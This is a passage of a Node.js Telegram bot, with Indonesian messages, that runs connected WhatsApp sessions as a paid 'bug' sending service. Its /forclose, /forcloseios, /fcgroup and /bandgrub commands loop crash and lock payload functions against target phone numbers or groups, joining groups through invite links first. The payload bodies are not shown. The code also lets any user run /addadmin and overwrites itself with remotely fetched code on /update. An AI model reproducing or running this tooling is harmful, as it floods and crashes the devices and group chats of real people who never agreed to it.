    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 20; i++) {   
      await XxNoX(sock, target);
      await ZynosBlankNew(sock, target);
      await QQSPrivateBlank(sock, target);
      await sleep(3000);
    }
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    await bot.editMessageText(`
\`\`\`
状态 : ✅ Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown"
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/fcgroup(.+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  let input = match[1] ? match[1].trim() : null;

  if (shouldIgnoreMessage(msg)) return;

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `❌ Kamu tidak memiliki akses premium!`);
  }

  if (!input) {
    return bot.sendMessage(chatId, `Contoh: /fcgroup https://chat.whatsapp.com/xxx`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }

    let groupJid;
    
    if (input.startsWith("https://chat.whatsapp.com/")) {
      let inviteCode = input.split("https://chat.whatsapp.com/")[1]?.trim();
      inviteCode = inviteCode.split("?")[0];
      if (!inviteCode) return bot.sendMessage(chatId, "❌ Link undangan tidak valid.");
      groupJid = await sock.groupAcceptInvite(inviteCode);
    } else if (input.endsWith("@g.us")) {
      groupJid = input;
    } else {
      return bot.sendMessage(chatId, "❌ Masukkan link grup atau JID yang valid.\nContoh: /fcgroup https://chat.whatsapp.com/xxx\nAtau: /fcgroup 628xxx@g.us");
    }

    const sentMessage = await bot.sendMessage(chatId, `
\`\`\`
状态 : ⏳Sedang mengirim......
\`\`\`
`, { parse_mode: "Markdown" });

    console.log("\x1b[32m[PROSES FORCLOSEGRUB]\x1b[0m Target grup: " + groupJid);
    
    for (let i = 0; i <= 100; i++) {
      await GcV2(sock, groupJid);
      await Gcv1(sock, groupJid);
      await DelayGb(sock, groupJid);
      await sleep(2000);
    }

    console.log("\x1b[32m[SUCCESS FORCLOSEGRUB]\x1b[0m Bug grup berhasil dikirim! 🚀");

    await bot.editMessageText(`
\`\`\`
状态 : ✅ Succes send bug to group!
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown"
    });

  } catch (error) {
    console.error("❌ Gagal forclose:", error);
    bot.sendMessage(chatId, `🙈 Gagal join atau kirim bug ke grup: ${error.message}\nPastikan:\n- Link valid\n- Bot tidak diblokir\n- Grup tidak tertutup`);
  }
});


bot.onText(/\/bandgrub(.+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  let input = match[1] ? match[1].trim() : null;

  if (shouldIgnoreMessage(msg)) return;

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `❌ Kamu tidak memiliki akses premium!`);
  }

  if (!input) {
    return bot.sendMessage(chatId, `Contoh: /bandgrub https://chat.whatsapp.com/xxx`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }

    let groupJid;
    
    if (input.startsWith("https://chat.whatsapp.com/")) {
      let inviteCode = input.split("https://chat.whatsapp.com/")[1]?.trim();
      inviteCode = inviteCode.split("?")[0];
      if (!inviteCode) return bot.sendMessage(chatId, "❌ Link undangan tidak valid.");
      groupJid = await sock.groupAcceptInvite(inviteCode);
    } else if (input.endsWith("@g.us")) {
      groupJid = input;
    } else {
      return bot.sendMessage(chatId, "❌ Masukkan link grup atau JID yang valid.\nContoh: /bandgrub https://chat.whatsapp.com/xxx\nAtau: /bandgrub 628xxx@g.us");
    }

    const sentMessage = await bot.sendMessage(chatId, `
\`\`\`
状态 : ⏳Sedang mengirim......
\`\`\`
`, { parse_mode: "Markdown" });

    console.log("\x1b[32m[PROSES bandgrub]\x1b[0m Target grup: " + groupJid);
    
    for (let i = 0; i <= 1; i++) {
      await LockGb(sock, groupJid);
    }

    console.log("\x1b[32m[SUCCESS bandgrub]\x1b[0m Bug grup berhasil dikirim! 🚀");

    await bot.editMessageText(`
\`\`\`
状态 : ✅ Succes send bug to group!
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown"
    });

  } catch (error) {
    console.error("❌ Gagal bandgrub:", error);
    bot.sendMessage(chatId, `🙈 Gagal join atau kirim bug ke grup: ${error.message}\nPastikan:\n- Link valid\n- Bot tidak diblokir\n- Grup tidak tertutup`);
  }
});


// Buat map untuk menyimpan waktu terakhir user menggunakan command
const userLastUsed = new Map();

bot.onText(/\/forclose (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  
  if (shouldIgnoreMessage(msg)) return;

  if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
    return bot.sendMessage(chatId, `❌ Kamu tidak memiliki akses premium!`);
  }

  // CEK JEDA 20 DETIK
  const now = Date.now();
  const lastUsed = userLastUsed.get(senderId) || 0;
  const timeLeft = 20000 - (now - lastUsed);
  
  if (timeLeft > 0) {
    const seconds = Math.ceil(timeLeft / 1000);
    return bot.sendMessage(chatId, `⏳ Tunggu ${seconds} detik lagi!`);
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }

    const sentMessage = await bot.sendMessage(chatId, `
\`\`\`
状态 : ⏳Sedang mengirim......
\`\`\`
`, { parse_mode: "Markdown" });
    
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    
    // UPDATE WAKTU TERAKHIR PAKAI
    userLastUsed.set(senderId, now);
    
    // PROSES PENGIRIMAN
    for (let i = 0; i < 30; i++) {
      await OnehitFc(sock, target);
    }
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    await bot.editMessageText(`
\`\`\`
状态 : ✅ Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown"
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});



bot.onText(/\/forcloseios (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const Jid = `${formattedNumber}@s.whatsapp.net`;
  const target = Jid;
  
if (shouldIgnoreMessage(msg)) return;

if (!premiumUsers.some(user => user.id === senderId && new Date(user.expiresAt) > new Date())) {
  return bot.sendMessage(chatId, `❌ Kamu tidak memiliki akses premium!`);
}

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "🙈 Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /reqpair 62xxx"
      );
    }

    const sentMessage = await bot.sendMessage(chatId, `
\`\`\`
状态 : ⏳Sedang mengirim......
\`\`\`
`, { parse_mode: "Markdown" });
    
    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 1; i++) {
      await ForcloseIos(sock, target);
    }
  
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");
    
    await bot.editMessageText(`
\`\`\`
状态 : ✅ Succes send bug
\`\`\`
`, {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      parse_mode: "Markdown"
    });

  } catch (error) {
    bot.sendMessage(chatId, `🙈 Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/iqc(.+)?/, async (msg, match) => {
  const chatId = msg.chat.id;
    
  const text = match[1] ? match[1].trim() : '';

  if (!text) {
    return bot.sendMessage(chatId, '❌ Format Salah: /iqc jam|batre|carrier|pesan\nContoh: /iqc 18:00|40|Indosat|hai hai', {
      reply_to_message_id: msg.message_id
    });
  }

  const parts = text.split('|');
  if (parts.length < 4) {
    return bot.sendMessage(chatId, '❌ Format salah! Gunakan:\n/iqc jam|batre|carrier|pesan\nContoh:\n/iqc 18:00|40|Indosat|hai hai', {
      reply_to_message_id: msg.message_id
    });
  }

  const time = parts[0].trim();
  const battery = parts[1].trim();
  const carrier = parts[2].trim();
  const messageParts = parts.slice(3);
  const messageText = messageParts.join('|').trim();

  if (!time || !battery || !carrier || !messageText) {
    return bot.sendMessage(chatId, '⚠️ Format salah! Pastikan semua field terisi:\n/iqc jam|batre|carrier|pesan', {
      reply_to_message_id: msg.message_id
    });
  }

  const waitingMsg = await bot.sendMessage(chatId, '⏳', {
    reply_to_message_id: msg.message_id
  });

  try {
    const encodedTime = encodeURIComponent(time);
    const encodedCarrier = encodeURIComponent(carrier);
    const encodedMessage = encodeURIComponent(messageText);
    
    const url = `https://brat.siputzx.my.id/iphone-quoted?time=${encodedTime}&batteryPercentage=${battery}&carrierName=${encodedCarrier}&messageText=${encodedMessage}&emojiStyle=apple`;

    const response = await fetch(url);
    
    if (!response.ok) {
      throw new Error(`API returned status ${response.status}`);
    }

    const arrayBuffer = await response.arrayBuffer();
    const buffer = Buffer.from(arrayBuffer);

    await bot.sendPhoto(chatId, buffer, {
      caption: `✅ *SUKSES BANG BY MIWA CHAN*`,
      parse_mode: 'Markdown',
      reply_to_message_id: msg.message_id
    });

    await bot.deleteMessage(chatId, waitingMsg.message_id);

  } catch (error) {
    console.error('Error:', error);
    
    await bot.deleteMessage(chatId, waitingMsg.message_id);
    
    await bot.sendMessage(chatId, '❌ Terjadi kesalahan, Coba lagi!', {
      reply_to_message_id: msg.message_id
    });
  }
});

bot.onText(/\/reqpair (.+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  if (!adminUsers.includes(msg.from.id) && !isOwner(msg.from.id)) {
  return bot.sendMessage(
    chatId,
    "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
    { parse_mode: "Markdown" }
  );
}
  const botNumber = match[1].replace(/[^0-9]/g, "");

  try {
    await connectToWhatsApp(botNumber, chatId);
  } catch (error) {
    console.error("Error in addbot:", error);
    bot.sendMessage(
      chatId,
      "Terjadi kesalahan saat menghubungkan ke WhatsApp. Silakan coba lagi."
    );
  }
});

const moment = require('moment');


bot.onText(/\/addprem(?:\s(.+))?/, (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
      return bot.sendMessage(chatId, "🙈 You are not authorized to add premium users.");
  }

  if (!match[1]) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID and duration. Example: /addprem 123456789 30d.");
  }

  const args = match[1].split(' ');
  if (args.length < 2) {
      return bot.sendMessage(chatId, "🙈 Missing input. Please specify a duration. Example: /addprem 123456789 30d.");
  }

  const userId = parseInt(args[0].replace(/[^0-9]/g, ''));
  const duration = args[1];
  
  if (!/^\d+$/.test(userId)) {
      return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number. Example: /addprem 123456789 30d.");
  }
  
  if (!/^\d+[dhm]$/.test(duration)) {
      return bot.sendMessage(chatId, "🙈 Invalid duration format. Use numbers followed by d (days), h (hours), or m (minutes). Example: 30d.");
  }

  const now = moment();
  const expirationDate = moment().add(parseInt(duration), duration.slice(-1) === 'd' ? 'days' : duration.slice(-1) === 'h' ? 'hours' : 'minutes');

  if (!premiumUsers.find(user => user.id === userId)) {
      premiumUsers.push({ id: userId, expiresAt: expirationDate.toISOString() });
      savePremiumUsers();
      console.log(`${senderId} added ${userId} to premium until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}`);
      bot.sendMessage(chatId, `🔥 User ${userId} has been added to the premium list until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  } else {
      const existingUser = premiumUsers.find(user => user.id === userId);
      existingUser.expiresAt = expirationDate.toISOString(); // Extend expiration
      savePremiumUsers();
      bot.sendMessage(chatId, `🔥 User ${userId} is already a premium user. Expiration extended until ${expirationDate.format('YYYY-MM-DD HH:mm:ss')}.`);
  }
});

bot.onText(/\/cekprem/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
    return bot.sendMessage(chatId, "🙈 You are not authorized to view the prem list.");
  }

  if (premiumUsers.length === 0) {
    return bot.sendMessage(chatId, "📌 No premium users found.");
  }

  let message = "```L I S T - R E G I S T \n\n```";
  premiumUsers.forEach((user, index) => {
    const expiresAt = moment(user.expiresAt).format('YYYY-MM-DD HH:mm:ss');
    message += `${index + 1}. ID: \`${user.id}\`\n   Expiration: ${expiresAt}\n\n`;
  });

  bot.sendMessage(chatId, message, { parse_mode: "Markdown" });
});
//=====================================
bot.onText(/\/addadmin(?:\s(.+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id

    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /addadmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. Example: /addadmin 6843967527.");
    }

    if (!adminUsers.includes(userId)) {
        adminUsers.push(userId);
        saveAdminUsers();
        console.log(`${senderId} Added ${userId} To Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been added as an admin.`);
    } else {
        bot.sendMessage(chatId, `🙈 User ${userId} is already an admin.`);
    }
});

bot.onText(/\/delprem(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna adalah owner atau admin
    if (!isOwner(senderId) && !adminUsers.includes(senderId)) {
        return bot.sendMessage(chatId, "🙈 You are not authorized to remove prem users.");
    }

    if (!match[1]) {
        return bot.sendMessage(chatId, "🙈 Please provide a user ID. Example: /prem 123456789");
    }

    const userId = parseInt(match[1]);

    if (isNaN(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. User ID must be a number.");
    }

    // Cari index user dalam daftar premium
    const index = premiumUsers.findIndex(user => user.id === userId);
    if (index === -1) {
        return bot.sendMessage(chatId, `🙈 User ${userId} is not in the regis list.`);
    }

    // Hapus user dari daftar
    premiumUsers.splice(index, 1);
    savePremiumUsers();
    bot.sendMessage(chatId, `🔥 User ${userId} has been removed from the prem list.`);
});

bot.onText(/\/deladmin(?:\s(\d+))?/, (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    // Cek apakah pengguna memiliki izin (hanya pemilik yang bisa menjalankan perintah ini)
    if (!isOwner(senderId)) {
        return bot.sendMessage(
            chatId,
            "🤬 *Akses Ditolak*\nAnda tidak memiliki izin untuk menggunakan command ini.",
            { parse_mode: "Markdown" }
        );
    }

    // Pengecekan input dari pengguna
    if (!match || !match[1]) {
        return bot.sendMessage(chatId, "🙈 Missing input. Please provide a user ID. Example: /deladmin 6843967527.");
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''));
    if (!/^\d+$/.test(userId)) {
        return bot.sendMessage(chatId, "🙈 Invalid input. Example: /deladmin 6843967527.");
    }

    // Cari dan hapus user dari adminUsers
    const adminIndex = adminUsers.indexOf(userId);
    if (adminIndex !== -1) {
        adminUsers.splice(adminIndex, 1);
        saveAdminUsers();
        console.log(`${senderId} Removed ${userId} From Admin`);
        bot.sendMessage(chatId, `🔥 User ${userId} has been removed from admin.`);
    } else {
        bot.sendMessage(chatId, `🙈 User ${userId} is not an admin.`);
    }
});

// ===== /update =====
bot.onText(/\/update/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (!isOwner(senderId)) {
    return bot.sendMessage(chatId,
      "❌ Hanya owner yang bisa menggunakan command ini.",
      { parse_mode: "HTML" }
    );
  }

  const statusMsg = await bot.sendMessage(chatId,
  `<code><tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Mengecek update dari GitHub...</code>`,
  { parse_mode: "HTML" }
);

  try {
    const fileRes = await axios.get(RAW_INDEX_URL + "?t=" + Date.now(), {
      responseType: "text",
      transformResponse: [(d) => d],
      timeout: 15000
    });

    require("fs").writeFileSync("./index.js", fileRes.data);

    await bot.editMessageText(
      `<code> <tg-emoji emoji-id="5373132725861496268">✅</tg-emoji> File index.js berhasil diupdate dari GitHub!
<tg-emoji emoji-id="6098230596788556786">🕐</tg-emoji> Bot akan restart...</code>`,
      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
    );

    setTimeout(() => process.exit(0), 2000);
  } catch (e) {
    await bot.editMessageText(
      `<code>❌ Gagal update: ${e.message}</code>`,
      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: "HTML" }
    );
  }
});

// isi function bug